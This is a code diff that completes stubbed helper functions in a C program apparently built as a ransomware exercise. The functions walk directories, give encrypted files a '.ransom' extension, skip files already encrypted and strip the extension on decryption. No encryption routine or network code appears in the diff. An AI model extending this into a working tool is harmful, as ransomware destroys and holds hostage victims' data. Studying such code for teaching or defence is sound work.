@@ -1,9 +1,14 @@
 #include "ransom.h"
 #include <stdbool.h>
 #include <stdio.h>
+#include <string.h>
+#include <dirent.h>
+#include <unistd.h>
+#include <stdlib.h>
 
 #define LEN_RANSOM_EXTENSION (strlen(".ransom"))
 #define LEN_DECRYPTED_EXTENSION (strlen(".decrypted"))
+
 
 /*
 ** Here, we are going recursively though directories and sub directory
@@ -45,12 +50,18 @@ int iter_recursively_through_files(char *path, char *password,
 
 void get_new_path_name(char *parentpath, char *finalpath, char *currentpath)
 {
-    // step 1
+    int len = strlen(parentpath);
+
+    if (len > 0 && parentpath[len - 1] == '/') {
+        snprintf(finalpath, MAX_FILEPATH, "%s%s", parentpath, currentpath);
+    } else {
+        snprintf(finalpath, MAX_FILEPATH, "%s/%s", parentpath, currentpath);
+    }
 }
 
 void add_file_extension(const char *filename, char *opt_filename)
 {
-    // step 1
+    snprintf(opt_filename, MAX_FILEPATH, "%s.ransom", filename);
 }
 
 
@@ -60,23 +71,39 @@ void add_file_extension(const char *filename, char *opt_filename)
 */
 bool skip_already_encrypted(const char *path)
 {
-    // step 2
+    if (skip_basics_path(path)) {
+        return true;
+    }
+
+    int len = strlen(path);
+
+    if (len > LEN_RANSOM_EXTENSION) {
+        if (!strcmp(&path[len - LEN_RANSOM_EXTENSION], ".ransom")) {
+            return true;
+        }
+    }
+    return false;
 }
 
 void remove_file_extension(const char *filename, char *opt_filename)
 {
     int len = strlen(filename);
 
-    if (!strcmp(&filename[len - LEN_RANSOM_EXTENSION], ".ransom"))
+    if (len > LEN_RANSOM_EXTENSION &&
+        !strcmp(&filename[len - LEN_RANSOM_EXTENSION], ".ransom")) {
         strncpy(opt_filename, filename, len - LEN_RANSOM_EXTENSION);
-    strcpy(opt_filename, filename);
+        opt_filename[len - LEN_RANSOM_EXTENSION] = '\0';
+    } else {
+        strcpy(opt_filename, filename);
+    }
+
     strcat(opt_filename, ".decrypted");
 }
 
 bool skip_basics_path(const char *path)
 {
     if (strcmp(path, ".")
-            && strcmp(path, ".."))
+         && strcmp(path, ".."))
         return false;
     return true;
 }
@@ -86,7 +113,8 @@ bool skip_already_decrypted(const char *path)
     int len = strlen(path);
 
     if (skip_basics_path(path) ||
-            !strcmp(&path[len - LEN_DECRYPTED_EXTENSION], ".decrypted"))
+         (len > LEN_DECRYPTED_EXTENSION &&
+          !strcmp(&path[len - LEN_DECRYPTED_EXTENSION], ".decrypted")))
         return true;
     return false;
 }
